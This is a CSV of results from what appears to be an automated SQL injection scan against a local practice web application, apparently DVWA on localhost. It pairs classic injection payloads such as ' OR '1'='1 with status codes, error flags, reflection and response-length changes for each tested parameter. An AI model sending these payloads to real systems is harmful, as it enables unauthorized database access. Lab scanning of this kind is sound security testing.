score,count,tested_url,param_or_field,payload,status_code,error_found,reflected,rel_length_change
78,1,http://localhost:8080/vulnerabilities/sqli/,id,' OR '1'='1' /*,200,True,False,0.9638312123241795
78,1,http://localhost:8080/vulnerabilities/sqli/,ALL_FIELDS,' OR '1'='1' /*,200,True,False,0.9638312123241795
78,1,http://localhost:8080/vulnerabilities/sqli/,id,';--,200,True,False,0.9638312123241795
78,1,http://localhost:8080/vulnerabilities/sqli/,ALL_FIELDS,';--,200,True,False,0.9638312123241795
78,1,http://localhost:8080/vulnerabilities/brute/,username,' OR '1'='1' /*,200,True,False,0.9515428571428571
78,1,http://localhost:8080/vulnerabilities/brute/,ALL_FIELDS,' OR '1'='1' /*,200,True,False,0.9515428571428571
78,1,http://localhost:8080/vulnerabilities/brute/,username,';--,200,True,False,0.9515428571428571
78,1,http://localhost:8080/vulnerabilities/brute/,ALL_FIELDS,';--,200,True,False,0.9515428571428571
30,4,http://localhost:8080/instructions.php?doc=%27+OR+%271%27%3D%271,doc,' OR '1'='1,200,False,False,5.9825610363726955
30,4,http://localhost:8080/instructions.php?doc=%22+OR+%221%22%3D%221,doc,""" OR ""1""=""1",200,False,False,5.9825610363726955
30,4,http://localhost:8080/instructions.php?doc=%27+OR+1%3D1+--+,doc,' OR 1=1 -- ,200,False,False,5.9825610363726955
30,4,http://localhost:8080/instructions.php?doc=%27+OR+%271%27%3D%271%27+--+,doc,' OR '1'='1' -- ,200,False,False,5.9825610363726955
30,4,http://localhost:8080/instructions.php?doc=%27+OR+%271%27%3D%271%27+%2F%2A,doc,' OR '1'='1' /*,200,False,False,5.9825610363726955
30,4,http://localhost:8080/instructions.php?doc=%22+OR+%22%22+%3D+%22,doc,""" OR """" = """,200,False,False,5.9825610363726955
30,4,http://localhost:8080/instructions.php?doc=%27%3B--,doc,';--,200,False,False,5.9825610363726955
30,4,http://localhost:8080/instructions.php?doc=%27+OR+%27a%27%3D%27a,doc,' OR 'a'='a,200,False,False,5.9825610363726955
22,1,http://localhost:8080/vulnerabilities/sqli/,id,' OR '1'='1,200,False,True,0.07635632953784327
22,1,http://localhost:8080/vulnerabilities/sqli/,ALL_FIELDS,' OR '1'='1,200,False,True,0.07635632953784327
22,1,http://localhost:8080/vulnerabilities/sqli/,id,' OR 1=1 -- ,200,False,True,0.07747265014512168
22,1,http://localhost:8080/vulnerabilities/sqli/,ALL_FIELDS,' OR 1=1 -- ,200,False,True,0.07747265014512168
22,1,http://localhost:8080/vulnerabilities/sqli/,id,' OR '1'='1' -- ,200,False,True,0.08193793257423532
22,1,http://localhost:8080/vulnerabilities/sqli/,ALL_FIELDS,' OR '1'='1' -- ,200,False,True,0.08193793257423532
22,1,http://localhost:8080/vulnerabilities/sqli/,id,' OR 'a'='a,200,False,True,0.07635632953784327
22,1,http://localhost:8080/vulnerabilities/sqli/,ALL_FIELDS,' OR 'a'='a,200,False,True,0.07635632953784327
20,1,http://localhost:8080/vulnerabilities/xss_r/,name,' OR '1'='1,200,False,True,0.001605872906629961
20,1,http://localhost:8080/vulnerabilities/xss_r/,ALL_FIELDS,' OR '1'='1,200,False,True,0.001605872906629961
20,1,http://localhost:8080/vulnerabilities/xss_r/,name,""" OR ""1""=""1",200,False,True,0.001605872906629961
20,1,http://localhost:8080/vulnerabilities/xss_r/,ALL_FIELDS,""" OR ""1""=""1",200,False,True,0.001605872906629961
20,1,http://localhost:8080/vulnerabilities/xss_r/,name,' OR 1=1 -- ,200,False,True,0.0018352833218628125
20,1,http://localhost:8080/vulnerabilities/xss_r/,ALL_FIELDS,' OR 1=1 -- ,200,False,True,0.0018352833218628125
20,1,http://localhost:8080/vulnerabilities/xss_r/,name,' OR '1'='1' -- ,200,False,True,0.0027529249827942187
20,1,http://localhost:8080/vulnerabilities/xss_r/,ALL_FIELDS,' OR '1'='1' -- ,200,False,True,0.0027529249827942187
20,1,http://localhost:8080/vulnerabilities/xss_r/,name,' OR '1'='1' /*,200,False,True,0.0025235145675613674
20,1,http://localhost:8080/vulnerabilities/xss_r/,ALL_FIELDS,' OR '1'='1' /*,200,False,True,0.0025235145675613674
20,1,http://localhost:8080/vulnerabilities/xss_r/,name,""" OR """" = """,200,False,True,0.001605872906629961
20,1,http://localhost:8080/vulnerabilities/xss_r/,ALL_FIELDS,""" OR """" = """,200,False,True,0.001605872906629961
20,1,http://localhost:8080/vulnerabilities/xss_r/,name,';--,200,False,True,0.0
20,1,http://localhost:8080/vulnerabilities/xss_r/,ALL_FIELDS,';--,200,False,True,0.0
20,1,http://localhost:8080/vulnerabilities/xss_r/,name,' OR 'a'='a,200,False,True,0.001605872906629961
20,1,http://localhost:8080/vulnerabilities/xss_r/,ALL_FIELDS,' OR 'a'='a,200,False,True,0.001605872906629961
20,1,http://localhost:8080/vulnerabilities/xss_s/,txtName,' OR '1'='1,200,False,True,0.001407601045646491
20,1,http://localhost:8080/vulnerabilities/xss_s/,mtxMessage,' OR '1'='1,200,False,True,0.001407601045646491
20,1,http://localhost:8080/vulnerabilities/xss_s/,ALL_FIELDS,' OR '1'='1,200,False,True,0.002815202091292982
20,1,http://localhost:8080/vulnerabilities/xss_s/,txtName,""" OR ""1""=""1",200,False,True,0.001407601045646491
20,1,http://localhost:8080/vulnerabilities/xss_s/,mtxMessage,""" OR ""1""=""1",200,False,True,0.001407601045646491
20,1,http://localhost:8080/vulnerabilities/xss_s/,ALL_FIELDS,""" OR ""1""=""1",200,False,True,0.002815202091292982
20,1,http://localhost:8080/vulnerabilities/xss_s/,txtName,' OR 1=1 -- ,200,False,True,0.001407601045646491
20,1,http://localhost:8080/vulnerabilities/xss_s/,mtxMessage,' OR 1=1 -- ,200,False,True,0.001407601045646491
20,1,http://localhost:8080/vulnerabilities/xss_s/,ALL_FIELDS,' OR 1=1 -- ,200,False,True,0.002815202091292982
20,1,http://localhost:8080/vulnerabilities/xss_s/,txtName,' OR '1'='1' -- ,200,False,True,0.0022119445003016287
20,1,http://localhost:8080/vulnerabilities/xss_s/,mtxMessage,' OR '1'='1' -- ,200,False,True,0.0022119445003016287
20,1,http://localhost:8080/vulnerabilities/xss_s/,ALL_FIELDS,' OR '1'='1' -- ,200,False,True,0.004423889000603257
20,1,http://localhost:8080/vulnerabilities/xss_s/,txtName,' OR '1'='1' /*,200,False,True,0.0022119445003016287
20,1,http://localhost:8080/vulnerabilities/xss_s/,mtxMessage,' OR '1'='1' /*,200,False,True,0.0022119445003016287
20,1,http://localhost:8080/vulnerabilities/xss_s/,ALL_FIELDS,' OR '1'='1' /*,200,False,True,0.004423889000603257
20,1,http://localhost:8080/vulnerabilities/xss_s/,txtName,""" OR """" = """,200,False,True,0.001407601045646491
20,1,http://localhost:8080/vulnerabilities/xss_s/,mtxMessage,""" OR """" = """,200,False,True,0.001407601045646491
20,1,http://localhost:8080/vulnerabilities/xss_s/,ALL_FIELDS,""" OR """" = """,200,False,True,0.002815202091292982
20,1,http://localhost:8080/vulnerabilities/xss_s/,txtName,';--,200,False,True,0.0
20,1,http://localhost:8080/vulnerabilities/xss_s/,mtxMessage,';--,200,False,True,0.0
20,1,http://localhost:8080/vulnerabilities/xss_s/,ALL_FIELDS,';--,200,False,True,0.0
20,1,http://localhost:8080/vulnerabilities/xss_s/,txtName,' OR 'a'='a,200,False,True,0.001407601045646491
20,1,http://localhost:8080/vulnerabilities/xss_s/,mtxMessage,' OR 'a'='a,200,False,True,0.001407601045646491
20,1,http://localhost:8080/vulnerabilities/xss_s/,ALL_FIELDS,' OR 'a'='a,200,False,True,0.002815202091292982
20,1,http://localhost:8080/vulnerabilities/csp/,include,' OR '1'='1,200,False,True,0.0016455101081335214
20,1,http://localhost:8080/vulnerabilities/csp/,ALL_FIELDS,' OR '1'='1,200,False,True,0.0016455101081335214
20,1,http://localhost:8080/vulnerabilities/csp/,include,""" OR ""1""=""1",200,False,True,0.0016455101081335214
20,1,http://localhost:8080/vulnerabilities/csp/,ALL_FIELDS,""" OR ""1""=""1",200,False,True,0.0016455101081335214
20,1,http://localhost:8080/vulnerabilities/csp/,include,' OR 1=1 -- ,200,False,True,0.0018805829807240243
20,1,http://localhost:8080/vulnerabilities/csp/,ALL_FIELDS,' OR 1=1 -- ,200,False,True,0.0018805829807240243
20,1,http://localhost:8080/vulnerabilities/csp/,include,' OR '1'='1' -- ,200,False,True,0.0028208744710860366
20,1,http://localhost:8080/vulnerabilities/csp/,ALL_FIELDS,' OR '1'='1' -- ,200,False,True,0.0028208744710860366
20,1,http://localhost:8080/vulnerabilities/csp/,include,' OR '1'='1' /*,200,False,True,0.0025858015984955335
20,1,http://localhost:8080/vulnerabilities/csp/,ALL_FIELDS,' OR '1'='1' /*,200,False,True,0.0025858015984955335
20,1,http://localhost:8080/vulnerabilities/csp/,include,""" OR """" = """,200,False,True,0.0016455101081335214
20,1,http://localhost:8080/vulnerabilities/csp/,ALL_FIELDS,""" OR """" = """,200,False,True,0.0016455101081335214
20,1,http://localhost:8080/vulnerabilities/csp/,include,';--,200,False,True,0.0
20,1,http://localhost:8080/vulnerabilities/csp/,ALL_FIELDS,';--,200,False,True,0.0
20,1,http://localhost:8080/vulnerabilities/csp/,include,' OR 'a'='a,200,False,True,0.0016455101081335214
20,1,http://localhost:8080/vulnerabilities/csp/,ALL_FIELDS,' OR 'a'='a,200,False,True,0.0016455101081335214
